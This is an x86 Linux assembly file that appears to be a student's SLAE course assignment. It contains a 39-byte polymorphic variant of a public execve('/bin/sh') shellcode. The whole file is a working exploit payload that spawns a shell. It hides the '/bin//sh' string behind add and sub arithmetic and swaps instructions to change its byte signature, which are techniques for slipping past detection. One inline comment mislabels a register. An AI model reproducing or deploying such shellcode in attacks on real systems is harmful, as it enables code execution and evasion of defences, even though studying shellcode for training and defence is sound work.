;Original Source Code URL :http://shell-storm.org/shellcode/files/shellcode-811.php
;Title:	Linux x86 execve("/bin/sh") - 28 bytes
;Author:	Jean Pascal Pereira <pereira@secbiz.de>
;Web:	http://0xffe4.org
;Original Shellcode Length : 28 bytes


;Modified Polymorphic Shellcodes as per SLAE Assignment # 6
;Assignment # 6-3
;Title: Polymorphic Shellcodes for Linux x86 execve("/bin/sh")
;Shellcode Length: 39
;SLAE-1122



global _start			

section .text

_start:

 xor    ebx,ebx      ;zero out ebx
 xor    ecx,ecx      ;zero out eax
 mul    ecx          ;zero out eax, edx
 push   eax          ;push eax on esp i.e stack

 mov esi,0xACB77373  
 sub esi,0x44444444  ;esi=0xACB77373-0x44444444, final esi=0x68732f2f 
 push esi            ; push esi on esp i.e. stack  

 mov edi, 0x19140CDA
 add edi, 0x55555555 ;edi=0x19140CDA+0x55555555, final edi=0x6e69622f 
 push edi            ;push edi on esp i.e. stack
 
 mov    ebx,esp      ; now ebx have "/bin//sh"
 
 xchg  ecx,eax       ;replace mov ecx,eax with x86 "xchg" instructions which is 1 byte less than "mov" x86 instructions
 xchg  edx,eax       ;replace mov edx,eax with x86 "xchg" instructions
 
 mov    al,0xb
 int    0x80
